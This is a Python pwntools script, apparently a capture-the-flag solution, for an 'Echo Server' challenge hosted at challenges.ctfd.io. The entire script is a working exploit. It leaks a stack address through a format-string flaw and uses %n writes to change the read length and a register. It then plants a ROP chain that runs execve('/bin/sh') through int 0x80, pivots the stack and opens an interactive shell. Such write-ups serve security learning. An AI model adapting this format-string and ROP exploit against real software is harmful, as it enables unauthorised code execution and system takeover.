from pwn import *

# target=process('./echoserver')
exe = ELF("/home/alessio/Scrivania/tools/CTFs/batpwn/Echo Server/echoserver")
HOST = "challenges.ctfd.io"
PORT = 30095
target = remote(HOST, PORT)
context.terminal = ["termite", "split", "-h"]
context.binary = exe

print("[+] Exploiting...")
print(target.recvline())


def tar(n):
    tar = stack_leak - 0x14 + (4 * n)
    return tar


# fs vuln to leak stack addr
fs = "%262$#lx"
target.sendline(fs)
stack_leak = int(target.recvline(), 16)
print(hex(stack_leak))

# increase number of bytes read to 103
targ = tar(263)
fs = p32(targ) + "%99x%5$n"
target.sendline(fs)

# important gadgets
xhcgeaxedi = 0x08081438
popedi = 0x0804b2bb
magic = 0x08078809  # xor ecx, ecx ; lea ebx, [edi - 0x2cf1b] ; int 0x80
popedx = 0x08064ca8
binshaddr = tar(10)

# create ROPchain on stack
payload = "A" * 20
payload += "\x2f\x62\x69\x6e"
payload += "\x2f\x73\x68\x00"
payload += p32(popedi)
payload += p32(11)
payload += p32(xhcgeaxedi)
payload += p32(popedi)
payload += p32(binshaddr + 0x2cf1b)
payload += p32(popedx)
payload += p32(0x0)
payload += p32(magic)
# payload+=p32(int0x80)
target.sendline(payload)

# overwrite ecx to enable stack pivot
targ = tar(264)
retaddr = tar(13)
lh = int(hex(retaddr)[6:10], 16)
hh = int(hex(retaddr)[2:6], 16)
fs = str(p32(targ)) + "%" + str(lh - 4) + "x" + "%5$hn"
target.sendline(fs)

# unset whiletrue to trigger stack pivot
targ = tar(261)
fs = p32(targ) + "%5$n"
target.sendline(fs)

target.interactive()
